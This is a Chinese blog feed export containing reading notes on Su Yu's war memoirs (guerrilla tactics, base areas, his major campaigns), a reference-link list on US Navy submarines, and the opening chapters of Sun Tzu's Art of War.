<p>敌人的后方是我们袭击的主要目标。我们袭击的主要对象：一是蒋政权的基础或爪牙，常常神出鬼没地捉敌人的保、甲长，造成当地统治者的恐慌和动摇；一是捕杀敌军的哨兵和侦探，使敌官兵惊恐，哨兵不敢放哨，尖兵也不敢当。敌人的兵力过于集中，不好下手，我们就搞他落伍掉队的，打他的”尾巴“，或者叫”截尾子“。</p>
<h3 id="2、根据地是游击战术的基础"><a href="#2、根据地是游击战术的基础" class="headerlink" title="2、根据地是游击战术的基础"></a>2、根据地是游击战术的基础</h3><h4 id="游击队的根据地建设"><a href="#游击队的根据地建设" class="headerlink" title="游击队的根据地建设"></a>游击队的根据地建设</h4><p><strong>社会调查：</strong></p>
<p>上井冈山后武装斗争同根地建设结合得更紧密了。我记得所有的部队都做社会调査。军部发给每个连队一张表，叫社会调査表。大体内容是地的地主、富农、中农、农人数及其比例各阶层占有土地数目及其比例;群众的斗争情况；当地工价、物价；地方农产品、土特产品；地形特点、河流宽容、深浅和流速、流量等等。连队要逐日将调査情况汇总上报。</p>
<p><strong>招兵宣传：</strong></p>
<p>p69</p>
<p>也许现在的青年人不能体会到官兵平等、废止肉刑这些基本制度所产生的强大威力因为他们是在人与人的平等关系中成长起来的。而当时，这些基本制度，唤醒了被压迫者长期被压抑着的 <strong>人的尊严</strong>，激发着对未来美好的无限希望，成为大家为共产主义事业奋斗牺牲的强大力量。这些新型的制度，是进行政治工作的强大武器。那时对于红军最有力的宣传就是:“红军官兵平等”，“红军不打士兵”。这 <strong>简单的语言，对劳苦农民和广大士兵，具有无穷的吸引カ</strong>，它是红军阶级本质的具体体现。</p>
<h4 id="游击队的群众工作"><a href="#游击队的群众工作" class="headerlink" title="游击队的群众工作"></a>游击队的群众工作</h4><blockquote>
<p>游击队要能自如的活动，根本的一条是要依靠群众会做群众工作。</p>
</blockquote>
<p>p152</p>
<p>我们一进入浙江，就向部队提出了这项要求。因为是新区，群众对我们不了解，加之语言不通，又受到敌人反动宣传的欺骗，群众难免有些害怕。他们听说红军来了，就躲起来，有的则被国民党反动派胁迫着离开了村庄。有时，<strong>我们连一个向导也不容易找到，筹措粮食给养更是困难</strong>。</p>
<p>为了向群众宣传，有时只好叫自己的侦察员化装成逃跑的群众，口里喊着:“红军来了！红军来了！”群众也跟着跑出来了。侦察员再把群众拦下来向他们说明情况，请他们带路，<strong>讲定每带十里路给一块银洋</strong>。当时我们的银洋还比较多。利用群众带路的机会，我们就做宣传。这样，<strong>群众得到了利益，又听我们讲了道理</strong>，知道我们是工人、农民的子弟兵，反对国民党抽了拉夫和摊派苛捐杂税，纪律又好，确是爱护群众的。一传十，十传百，就不再相信国民党那一套骗人的鬼话了。在这一阶段的活动中，我们了解了群众的疾苦，熟悉了他们的风俗习惯，学习了一些浙南方言，积累了一些开展群众工作的新经验，对我们开辟浙西南游击根据地很有作用。</p>
<h4 id="游击区的公开斗争vs隐蔽工作"><a href="#游击区的公开斗争vs隐蔽工作" class="headerlink" title="游击区的公开斗争vs隐蔽工作"></a>游击区的公开斗争vs隐蔽工作</h4><p>p171<br>我们把公开的武装斗争同隐蔽的群众工作更加有机地结合起来。</p>
<p>我们分别组成了”突击队”和”牵制队”。所谓”突击队“也就是武装工作队，主要任务不是打仗，而是带领便衣队、短枪队坚持基本地区，做发动群众的工作，进行游击根据地建设。所谓”牵制队“就是游击队的主力部队。它的主要任务是在广大范围内进行公开的武装斗争，牵制、吸引，打击敌人，以掩护和保卫基本地区，并发展新的游击区。</p>
<p>p172<br>在我率领”牵制队“单独活动的过程中，考虑到这样一个问题：为了长期坚持敌后，形成比较巩固的游击区，并为主力部队提供更多的”落脚点“和”跳板“，我们不仅要有相对稳定的较大块的游击根据地，而且在较大块的游击根据地周围，还必须建立一些小块的游击根据地和若干的 <strong>游击基点</strong>，这些小块的游击根据地和游击基点，有公开的，有秘密的；在你来我往，敌人势力比较强大的地区，还应有”白皮红心“式的两面政权，使我们的整个游击区形成几种类型的组合。为此，我决定把建立游击基点作为”牵制队“的重要任务之一，<strong>一面打仗，一面建设</strong>。</p>
<p><strong>反”清乡“斗争</strong><br>一九四一年初，日本侵华派遣军总司令部就确定了以长江下游为起点，逐次推行”清乡“的方案，采取”三光“政策。我们规定在敌情特别严重的地区，实行公开的合法、秘密的斗争为主。</p>
<p>为掌握反”清乡“斗争的第一手材料，及时总结反”清乡“斗争经验，也为了提高司令部机关军事指挥水平，我从师直属队选派中层领导干部和骨干组织武工队，轮流进入”清乡“区参加斗争。</p>
<p>武工队配备短枪，主要任务是深入据点，镇压日伪”清乡“的重要人员。民兵和群众在武工队带动下，采取盯梢、诱捕、”扎粽子“、”包馄饨“、”背娘舅“、”老鹰捉鸡“等各种办法捕杀汉奸、特务。仅四、五两月全区不完全统计，共处决特务、汉奸二百七十四人。苏南调来的”清乡“队员，被我捕杀半数。敌人原拟续调苏中的两个”清乡“大队，未敢再来。许多伪”清乡“人员请长假、开小差或躲在南通城里不敢上任。使敌伪失去了耳目、手足。</p>
<h3 id="3、统一协调是游击战术的组织保障"><a href="#3、统一协调是游击战术的组织保障" class="headerlink" title="3、统一协调是游击战术的组织保障"></a>3、统一协调是游击战术的组织保障</h3><h4 id="苏中军区整训经验"><a href="#苏中军区整训经验" class="headerlink" title="苏中军区整训经验"></a>苏中军区整训经验</h4><p>一九四二年，新四军苏中军区组织了统一整编整训。</p>
<p><strong>存在的问题：</strong><br>一是主力部队长期频繁作战，消耗过大，缺少整训，不利于今后的发展；<br>二是地方武装数量虽已超过主力，但较多用于执行警备任务，较少用于进击敌人，还不能独立担负起坚持原地斗争的任务；<br>三是苏中今后除第二分区北部可能稍趋缓和外，其余地区特别第三、第四分区将更趋紧张，回旋余地更加狭窄，部队过于拥挤，容易遭受损失。</p>
<p><strong>整编方案：</strong><br>各旅保留一个主力团（即第一、第四、第七、第五十二团），并予以充实加强，其余主力团地方化，与各县团合并，成为地方团的骨干力量。</p>
<p>经过这次整编，使军区有主力在手，随时可以对重要方向实施突击，而各分区、各县也都有较强的武装作为机动兵力，配合区游击队和民兵，担负坚持原地斗争的任务。主力军得到了轮流作战、轮流整训的条件，地方军则大为加强，并在斗争中逐步成长，上升为新的主力。而大量半脱产和脱产的民兵，成为群众性抗日游击战争的的伟大力量和不断补充壮大我军的源泉。</p>
<h4 id="闽浙游击区的历史矛盾"><a href="#闽浙游击区的历史矛盾" class="headerlink" title="闽浙游击区的历史矛盾"></a>闽浙游击区的历史矛盾</h4><p>从历史的角度看，新四军苏中军区的整训工作应该是吸取了历史上闽东、闽北、浙南三个游击区因严重内部矛盾而造成重大损失的经验教训。</p>
<p>p167<br>（1936年）闽浙临时省委是在失去党中央和上级党组织领导的情况下由浙南和闽东两个游击区的党的负责人，根操实际斗争的共同需要协商一致成立的。临时省委成立后，由于浙南游击区和闽东游击区双方都有些本位主义、山头主义，从浙南方面来说，还有主力自居的思想，同时我们都不知道遵义会议的精神，受“左”傾冒险主义肃反扩大化的影响，互相 <strong>错抓了人、错杀了人</strong>，发生了误会，双方都有气，以致产生了矛盾。临时省委本应按照党的原则妥善地来处理这些矛盾，但刘英同志却想“统”掉闽东。他几次提出要把叶飞同志留在临时省委工作，藉以调离闽东。我不赞成，认为这对坚持闽东游击根据地和协调两个地区的关系不利，也不符合组成临时省委的初衷。我对刘英同志决定派到闽东独立师任政委的人选也认为不当，可能对双方团结起不好的作用。</p>
<p>p168<br>一九三六年秋（时间记不准），我正活动于闽浙边境之庆元县境，刘英同志以临时省委的名义给我送来一封信，要我乘与叶飞同志见面的机会，把叶飞同志押送省委，并派来一支武装监督执行。……. 叶飞同志如被押送到省委实在是很危险的。幸喜在途中遇到敌人伏击，叶飞同志乘机脱险。闽东同志随即宣布退出闽浙临时省委。</p>
<p>p169<br>（刘英）当时对我采取了对敌斗争的手段，派了一个班把我监视了起来，剥夺了我的行动自由。</p>
<p>我被迫违心地作了”申明”。这场斗争才算结束。此后，我和刘英同志就分开活动了，刘英同志主要坚持于浙南地区，我则主要活动在浙赣路南侧和浙西南地区。我们在总的方面仍是统一的，配合的，但在各自活动的地区内则各自行动，而且互相之间心存戒备，<strong>每当必须会合时也各自带着武装</strong>，并且不住在一个房子里。</p>
<h2 id="二、军事谋略"><a href="#二、军事谋略" class="headerlink" title="二、军事谋略"></a>二、军事谋略</h2><h3 id="第一次全军覆没：北上抗日先遣队"><a href="#第一次全军覆没：北上抗日先遣队" class="headerlink" title="第一次全军覆没：北上抗日先遣队"></a>第一次全军覆没：北上抗日先遣队</h3><p>p133</p>
<p>总结北上抗日先遣队的经验教训，粟裕认为最主要的教训有以下几点：</p>
<p>一、派出抗日先遣队的战略意图，赋予抗日先遣队的任务，是要以它的北上行动”促敌人进行战略与作战部署上的变更”。这个 <strong>要求过高了</strong>，没有实现的客观基础，因而是主观主义的，它导致了在作战指导上的盲目冒险。</p>
<blockquote>
<p>是准备退却，派先遣队去做个引子，不是要北上，而是要南下（指中央红军主力从中央苏区西南部转移）。—— 1973年12月，朱德</p>
</blockquote>
<p>中央下达的作战任务训令和政治训令，赋予抗日先遣队的任务是：深入到敌人深远后方闽浙赣皖诸省，最高度地发展游击战争，创造游击区域，一直到建立新的苏维埃根据地；最高度地开展反日运动，把群众的反日斗争发展到武装民众的民族战争的高点；通过在敌人深远后方的反日民族解放运动及土地革命的发展，促进敌人进行战略与作战部署上的变更。上述任务的确定，显然是<strong>一厢情愿</strong>。</p>
<p>二、当形势已经发生了根本变化，未能及时实行由正规战向游击战、由正规军向游击队的军事战略转变，这是使抗日先遣队遭受挫折和失败的主要原因。</p>
<p>在强大敌军”追剿“下，应适当分散兵力，形成几个目标，同敌人盘旋 <strong>兜圈子</strong> ，多打游击战，以吸引、迷惑和打击敌人；在适当时机，集中兵力，打游击性的运动战，歼敌一部，以改变不利态势，争取战争主动权；既要积极打击敌人，又不盲目地打硬仗、拼消耗。</p>
<p>抗日先遣队后期的整编，更是一个严重的教训。…… 把长于打游击的红十军和地方武装同长于运动战的红七军团合编，组成新的大兵团，集中在一起打运动战。</p>
<p>关于这次合编，朱德在关于战史问题的谈话中这样评价： </p>
<blockquote>
<p>编成一个军团，不编不垮。一遍正规战打不成，游击战也打不成。经验还是要把正规军变成游击队。—— 1973年12月，朱德。</p>
</blockquote>
<h2 id="战例全集"><a href="#战例全集" class="headerlink" title="战例全集"></a>战例全集</h2><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>粟裕一生先后六次负伤，颅内、体内留有弹片、弹头。特别是有多次全军覆没、只身脱险的经历，这些经历共同塑造了他以弱胜强、险中求胜的指挥风格。</p>
<ul>
<li>南昌起义：警卫班长；南昌起义部队大部覆没、主要将领流散。朱德、陈毅率残部七八百人进入赣南山区；</li>
<li>第四次反围剿：硝石战斗中，粟裕左臂严重受伤，养伤6个月，留下了终身残疾；</li>
<li>第五次反围剿：红军损失惨重，丧失大部中央苏区</li>
<li>北上抗日先遣队（红十军团/红七军团/红十军）：1934年12月安徽黄山谭家桥战斗（补充第一旅旅长：王耀武），军团长寻淮洲阵亡，方志敏被俘。粟裕右臂负伤，率小部分部队突围成功，转入浙西南地区游击作战。</li>
</ul>
<h4 id="经典战例"><a href="#经典战例" class="headerlink" title="经典战例"></a>经典战例</h4><p>粟裕指挥的经典战例包括：</p>
<ul>
<li>黄桥战役：1940年10月，粟裕时任新四军苏北指挥部副指挥，对手：韩德勤（江苏省政府主席兼鲁苏战区副总司令）；<br>战绩：全歼韩德勤部嫡系第89军（中将军长李守维溺水）、独立第6旅（中将旅长翁达战败自杀）；<br>全歼第89军、第33师（俘虏师长孙启人）、保安第十六旅，保安第三旅、保安第五旅各歼灭一个团，俘虏九十九旅旅长苗瑞林等各级军官630余人。</li>
<li>车桥战役：1944年3月，粟裕时任新四军第一师师长，战役协同：新四军第三师（黄克诚）；对手：三泽昌雄大佐（日军第64师团、第65师团）<br>战绩：歼灭日军（大佐）以下465人（生俘24人）、伪军483人（生俘168人）；新四军牺牲54人，负伤138人。</li>
<li>天目山战役：1945年3-6月，粟裕时任新四军苏浙军区司令员，对手：顾祝同（第三战区司令长官）；<br>  战绩：全歼第三战区第一突击队（击毙少将司令胡旭旰）、第五十二师（俘虏副师长韩德考、即韩德<br>勤之弟，淮海战役中再次被俘）、第七十九师（俘虏参谋长罗先觉等以下官兵近三千人）。</li>
<li>高邮战役：1945年12月，抗日战争最后一役。</li>
<li>陇海线徐（州）海（州）段战役：暂略。</li>
<li>苏中战役：，1946年7-8月，粟裕时任华中野战军司令员：对手：李默庵（中将、第三方面军司令官、第一绥靖区司令官，著有《李默庵回忆录》）<br>战绩：苏中战役历时一个半月”七战七捷“，连续进行七次战斗，重创整编六十九师、全歼6个旅（含69师99旅）、5个交警大队（相当于整编师营级编制；交警总队隶属交通部，实际由军统控制的特务武装，由原军统旗下的别动军、忠义救国军、中美特种技术训练班、交通巡查部队，及原汪伪税警总团等武装力量组成，全美式武器装备），共53000余人。华中野战军共伤亡16000余人。<br>参考文献：《苏中七战七捷的概述》1946年9月25日粟裕在华野干部会议上对整个战役的总结报告。</li>
<li>宿北战役：1946年12月，全歼整编六十九师（中将师长戴之奇为蒋经国亲信，战败后自杀）、整编十一师一部。</li>
<li>鲁南战役：1747年1月，粟裕时任华中野战军司令员；对手：薛岳（徐州绥靖公署主任，战后失去指挥权）、马励武（整编二十六师师长，兼指挥第一快速纵队）、周毓英（整编51师师长）<br>战绩：全歼<strong>整编二十六师</strong>（俘虏师长马励武、师部及第四十四旅、第一六九旅）；全歼<strong>整编第五十一师</strong>（俘虏师长周毓英），歼灭<strong>整编第二十八师</strong>之第八十旅、炮兵第五团、战车营等；<strong>第一快速纵队</strong>全军覆没（以第28军第80师为基干，配属战车第一团第一营、4个榴弹炮营、1个汽车团）。此役缴获美式105mm榴弹炮48门，坦克24辆，汽车470台，之后华东野战军以此为基础组建<strong>特种兵纵队</strong>。</li>
<li>莱芜战役：1947年2月，粟裕时任华东野战军副司令员。对手：陈诚（参谋总长，保定军校第八期、黄埔一期）、薛岳（徐州绥靖公署主任，战后背锅撤职，保定军校第六期）、王耀武（中将、第四方面军司令官、第二绥靖区司令官，黄埔三期）<br>战绩：重创第二绥靖区，徐州绥靖公署撤销。王耀武在给李天霞的信中说：“莱芜战役，损失惨重，百年教训，刻骨铭心“。全歼美械<strong>整编第七十七师</strong>（师长田君健阵亡），李仙洲南进兵团指挥所、第七十三军军部（军长韩浚被俘）及所辖7个师5.6万余人，俘虏46805人。</li>
<li>孟良崮战役：1947年5月，粟裕时任；对手：陈诚（参谋总长，保定军校第八期、黄埔一期）、顾祝同（陆军总司令）、汤恩伯（第一兵团司令），王敬久（第二兵团司令，下辖第五军邱清泉等，王与邱势同水火）、欧震（第三兵团司令，下辖整编十一师胡琏等，出身粤军、曾任叶挺独立团营长南昌起义后倒戈）、王耀武（第二绥靖区司令官，黄埔三期）、冯治安（第三绥靖区司令官，西北军）<br>战绩：全歼<strong>整编七十四师</strong>（师长张灵甫阵亡）、第一兵团汤恩伯撤职、第三兵团司令欧震撤职、<strong>整编八十三师</strong>师长李天霞送交军事法庭、<strong>整编二十五师</strong>师长黄百韬撤职留任；此役之后华东野战军实力大增，还装备了重炮兵与工兵。</li>
<li>沙土集战役：1947年9月，全歼<strong>整编五十七师</strong>。</li>
<li>豫东战役：1948年6月至7月，粟裕时任华东野战军代司令员兼代政委，战役协同：中原野战军（刘伯承、邓小平）；对手：顾祝同（徐州剿总司令）、邱清泉（整编第五军军长）、刘汝明（第四绥靖区司令）、胡琏（整编第十八军、整11师、整3师）、刘茂恩（河南省主席、整66师、整68师，逃脱）、区寿年（第7兵团司令官，第六绥靖区副司令，下辖整75师、整72师、新编21旅，舅舅是蔡廷锴）、孙元良（第16兵团司令官，下辖整编第47军）、黄百韬（战役后期以兵团司令官身份指挥整编25师及快速纵队）<br>战绩：豫东战役改变了中原和华东战场的战略态势，同时双方损失都很大。全歼第7兵团（俘虏兵团司令区寿年、整编七十五师师长沈澄年等）、全歼整编六十六师（师长李仲辛阵亡）、重创黄百韬兵团。战后邱清泉受申斥“行动迟缓，应另行议处”，黄百韬因功获颁青天白日勋章、破格晋升第七兵团中将司令官，该晋升引起邱清泉等人不满。</li>
<li>济南战役：1948年9月，粟裕时任华东野战军代司令员兼代政委、战役总指挥，许世友（山东兵团司令），宋时轮（10纵司令员，负责指挥攻城西集团），聂凤智（9纵司令员，负责指挥攻城东集团）；对手：王耀武（第二绥靖区司令官，黄埔三期），牟中珩（ 第二绥靖区副司令长官，保定军校第九期，先后投靠吴佩孚/刘文辉/张宗昌/于学忠/张学良等）</li>
<li>淮海战役：暂略。</li>
<li>渡江战役：暂略。</li>
<li>上海战役：暂略。</li>
</ul>
<h5 id="新四军：黄桥战役"><a href="#新四军：黄桥战役" class="headerlink" title="新四军：黄桥战役"></a>新四军：黄桥战役</h5><p>黄桥周围，全长约两公里。我和陶勇同志商量：防御兵力不足，只能保证重点，机动部署。从当时的敌情出发，西边、南边不派部队，由后勤、伙夫担子担负警戒；北门只放一个班；其余兵力全部集中在东门之南、北一线。p232</p>
<h2 id="暂定：个人经历与指挥风格"><a href="#暂定：个人经历与指挥风格" class="headerlink" title="暂定：个人经历与指挥风格"></a>暂定：个人经历与指挥风格</h2><h3 id="童年"><a href="#童年" class="headerlink" title="童年"></a>童年</h3><h4 id="长工阿陀"><a href="#长工阿陀" class="headerlink" title="长工阿陀"></a>长工阿陀</h4><p>童年 p5</p>
<p>现在人们都重视学龄前教育和智力开发，为我学龄前开发智力的首推阿陀了；每个人都有童年的好朋友，我童年时的好朋友就是阿陀，我特别喜欢他。</p>
<p>阿陀也不把清规戒律放在眼里。我们那里不准吃狗肉，说是吃了狗肉，死后灵魂也进不了祖庙。但阿陀却带着我在野外偷偷地烧狗肉吃。</p>
<h2 id="未分类：评价对手"><a href="#未分类：评价对手" class="headerlink" title="未分类：评价对手"></a>未分类：评价对手</h2><h4 id="土木系十八军"><a href="#土木系十八军" class="headerlink" title="土木系十八军"></a>土木系十八军</h4><p>p159<br>罗卓英是一只狡猾的老狐狸。当他查明我游击队主力已突围进入浙闽边境后，知道以数万大军追捕我分散活动的不足千人的游击队，无异”以拳头打跳蚤“，不能奏效。因此，他除派一个师约五个团的兵力追堵我军外，仍将几十个团的大部队死死地箍住我纵横一百公里的浙西南中心区，企图彻底摧毁我游击根据地。</p>
<p>p157<br>由罗卓英任军长的第十八军，是陈诚起家的老本，装备精良，人员充实，训练有素，战斗力较强，以后被称为国民党五大主力之一。其师、团长中如黄维、霍揆彰、李树森、宋瑞珂、胡琏、阙汉骞、高魁元等，后来都是国民党军中的著名人物。</p>
<h2 id="碎片"><a href="#碎片" class="headerlink" title="碎片"></a>碎片</h2><ul>
<li>参谋团</li>
<li>情报网</li>
<li>骑兵</li>
<li>炮兵</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|《孙子兵法》研究</a></li>
<li><a href="https://riboseyim.github.io/2020/02/08/Commander-Art-Of-War-SuYu/" target="_blank" rel="noopener">讲武堂|粟裕的军事谋略与指挥艺术</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://ctext.org/wiki.pl?if=gb&amp;res=3&amp;remap=gb" target="_blank" rel="noopener">《纪效新书》| 明·戚继光 | 四库全书本</a></li>
<li><a href="http://www.shuku.net:8082/novels/zhuanji/syzzhylu/syzzhylu.html" target="_blank" rel="noopener">《粟裕战争回忆录》 | 粟裕 </a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>Commander-Navy-Digital</title>
    <url>/2018/04/09/Commander-Navy-Digital/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/3U7QifYIVnUPScBM78RDGQ" target="_blank" rel="noopener">美军核潜艇部队现状及其发展 | 2018-03-12 知远战略与防务研究所</a></li>
<li><a href="https://www.pmume.com/hjbk/nnc0w.shtml" target="_blank" rel="noopener">海军百科|潜艇潜望镜</a></li>
<li><a href="https://www.pmume.com/hjbk/nnoih.shtml" target="_blank" rel="noopener">海军百科|攻击潜望镜</a></li>
<li><a href="http://digi.tech.qq.com/a/20170921/013387.htm" target="_blank" rel="noopener">美国海军居然用Xbox手柄来控制潜艇潜望镜|腾讯数码2017-09-21</a></li>
<li><a href="https://www.digitaltrends.com/gaming/xbox-360-controller-us-navy-submarine-periscope/" target="_blank" rel="noopener">The U.S. Navy is using Xbox 360 controllers to operate submarine periscopes | 9.19.17</a></li>
<li><a href="https://www.digitaltrends.com/cool-tech/navy-xbox-controllers-attack-submarines/" target="_blank" rel="noopener">Newest Navy attack sub uses an Xbox controller to operate its periscope | 3.17.18</a></li>
<li><a href="https://www.digitaltrends.com/health-fitness/navy-bans-e-cigarettes/" target="_blank" rel="noopener">Dishonorable discharge for e-cigs — U.S. Navy bans the devices aboard vessels|4.16.17</a></li>
<li><a href="https://www.digitaltrends.com/cool-tech/littoral-combat-ships/" target="_blank" rel="noopener">Navy uses virtual reality to train crews for deployment on the ships of tomorrow|9.2.17</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%BC%97%E5%90%89%E5%B0%BC%E4%BA%9A%E7%BA%A7%E6%A0%B8%E6%BD%9C%E8%89%87" target="_blank" rel="noopener">维基百科：弗吉尼亚级攻击型核潜艇</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9C%8B%E6%B5%B7%E8%BB%8D%E6%BD%9B%E8%89%87%E7%B4%9A%E5%88%A5%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">维基百科：美国海军潜艇级别列表</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>《孙子兵法》研究会</title>
    <url>/2020/02/04/Commander-Art-Of-War/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>孙子曰：昔之善战者，先为不可胜，以待敌之可胜。不可胜在己，可胜在敌。故善战者，能为不可胜，不能使敌之可胜。</p>
</blockquote>
<ul>
<li>始计第一（原篇名“计”）</li>
<li>作战第二</li>
<li>谋攻第三</li>
<li>军形第四（原篇名“形”）</li>
<li>兵势第五（原篇名“势”）</li>
<li>虚实第六（原篇名“实虚”）</li>
<li>军争第七</li>
<li>九变第八</li>
<li>行军第九</li>
<li>地形第十</li>
<li>九地第十一</li>
<li>火攻第十二</li>
<li>用间第十三</li>
</ul>
<a id="more"></a>
<h2 id="《孙子兵法》正文"><a href="#《孙子兵法》正文" class="headerlink" title="《孙子兵法》正文"></a>《孙子兵法》正文</h2><h4 id="一、计篇"><a href="#一、计篇" class="headerlink" title="一、计篇"></a>一、计篇</h4><p>孙子曰：兵者，国之大事，死生之地，存亡之道，不可不察也。</p>
<p>　　故经之以五事，校之以计，而索其情：一曰道，二曰天，三曰地，四曰将、五曰法。道者，令民与上同意也，故可以与之死，可以与之生，而不畏危。天者，阴阳，寒暑、时制也。地者，远近、险易、广狭、死生也。将者，智、信、仁、勇、严也。法者，曲制、官道、主用也。凡此五者，将莫不闻，知之者胜，不知者不胜。故校之以计，而索其情，曰：主孰有道？将孰有能？天地孰得？法令孰行？兵众孰强？士卒孰练？赏罚孰明？吾以此知胜负矣。</p>
<p>　　将听吾计，用之必胜，留之；将不听吾计，用之必败，去之。计利以听，乃为之势，以佐其外。势者，因利而制权也。</p>
<p>　　兵者，诡道也。故能而示之不能，用而示之不用，近而示之远，远而示之近；利而诱之，乱而取之，实而备之，强而避之，怒而挠之，卑而骄之，佚而劳之，亲而离之。攻其无备，出其不意。此兵家之胜，不可先传也。</p>
<p>　　夫未战而庙算胜者，得算多也；未战而庙算不胜者，得算少也。多算胜，少算不胜，而况于无算乎？吾以此观之，胜负见矣。</p>
<h4 id="二、作战篇"><a href="#二、作战篇" class="headerlink" title="二、作战篇"></a>二、作战篇</h4><p>孙子曰：凡用兵之法，驰车千驷，革车千乘，带甲十万，千里馈粮，则内外之费，宾客之用，胶漆之材，车甲之奉，日费千金，然后十万之师举矣。</p>
<p>　　其用战也胜，久则钝兵挫锐，攻城则力屈，久暴师则国用不足。夫钝兵挫锐，屈力殚货，则诸侯乘其弊而起，虽有智者，不能善其后矣。故兵闻拙速，未睹巧之久也。夫兵久而国利者，未之有也。故不尽知用兵之害者，则不能尽知用兵之利也。</p>
<p>　　善用兵者，役不再籍，粮不三载，取用于国，因粮于敌，故军食可足也。国之贫于师者远输，远输则百姓贫；近师者贵卖，贵卖则百姓财竭，财竭则急于丘役。力屈、财殚，中原、内虚于家，百姓之费，十去其七；公家之费，破军罢马，甲胄矢弓，戟盾矛橹，丘牛大车，十去其六。</p>
<p>　　故智将务食于敌，食敌一钟，当吾二十钟；萁秆一石，当吾二十石。</p>
<p>　　故杀敌者，怒也；取敌之利者，货也。车战得车十乘以上，赏其先得者而更其旌旗。车杂而乘之，卒善而养之，是谓胜敌而益强。</p>
<p>　　故兵贵胜，不贵久。故知兵之将，生民之司命，国家安危之主也。</p>
<h4 id="三、谋攻篇"><a href="#三、谋攻篇" class="headerlink" title="三、谋攻篇"></a>三、谋攻篇</h4><p>孙子曰：夫用兵之法，全国为上，破国次之，全军为上，破军次之；全旅为上，破旅次之；全卒为上，破卒次之；全伍为上，破伍次之。是故百战百胜，非善之善者也；不战而屈人之兵，善之善者也。</p>
<p>　　故上兵伐谋，其次伐交，其次伐兵，其下攻城。攻城之法为不得已。修橹轒辒，具器械，三月而后成，距堙，又三月而后已。将不胜其忿而蚁附之，杀士三分之一而城不拔者，此攻之灾也。</p>
<p>　　故善用兵者，屈人之兵而非战也，拔人之城而非攻也，毁人之国而非久也，必以全争于天下。故兵不顿而利可全，此谋攻之法也。</p>
<p>　　故用兵之法，十则围之，五则攻之，倍则分之，敌则能战之，少则能逃之，不若则能避之。故小敌之坚，大敌之擒也。</p>
<p>　　夫将者，国之辅也。辅周，则国必强；辅隙，则国必弱。</p>
<p>　　故君之所以患于军者三：不知军之不可以进而谓之进，不知军之不可以退而谓之退，是谓“縻军”；不知三军之事，而同三军之政者，则军士惑矣；不知三军之权，而同三军之任，则军士疑矣。三军既惑且疑，则诸侯之难至矣，是谓“乱军引胜”。</p>
